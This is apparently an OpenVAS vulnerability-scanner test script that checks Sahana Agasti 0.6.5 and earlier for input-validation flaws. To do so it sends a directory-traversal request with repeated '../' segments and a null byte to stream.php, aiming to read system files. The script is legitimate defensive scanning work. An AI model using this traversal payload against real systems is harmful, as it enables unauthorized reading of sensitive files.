###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sahana_45730.nasl 13 2013-10-27 12:16:33Z jan $
#
# Sahana Agasti Multiple Input Validation Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Sahana Agasti is prone to multiple input-validation vulnerabilities
because it fails to sufficiently sanitize user-supplied data.

An attacker can exploit these vulnerabilities to obtain potentially
sensitive information and to execute arbitrary local scripts in the
context of the webserver process, which may aid in redirecting users
to a potentially malicious site. This may allow the attacker to
compromise the application and the computer and may aid in phishing
attacks; other attacks are also possible.

Sahana Agasti versions 0.6.5 and prior are vulnerable.";

tag_solution = "Vendor updates are available. Please contact the vendor for details.";

if (description)
{
 script_id(103038);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-01-21 13:34:43 +0100 (Fri, 21 Jan 2011)");
 script_bugtraq_id(45730);
 script_tag(name:"cvss_base", value:"4.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
 script_tag(name:"risk_factor", value:"Medium");
 script_name("Sahana Agasti Multiple Input Validation Vulnerabilities");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/45730");
 script_xref(name : "URL" , value : "http://www.sahanafoundation.org/Sahana066");
 script_xref(name : "URL" , value : "https://launchpad.net/sahana-agasti/");
 script_xref(name : "URL" , value : "http://www.sahanafoundation.org/");

 script_description(desc);
 script_summary("Determine if installed Sahana Agasti is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("sahana_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"sahana"))exit(0);
files = traversal_files();

foreach file (keys(files)) {
   
  url = string(dir, "/www/stream.php?mod=",crap(data:"../",length:3*9),files[file],"%00"); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_warning(port:port);
    exit(0);

  }
}

exit(0);
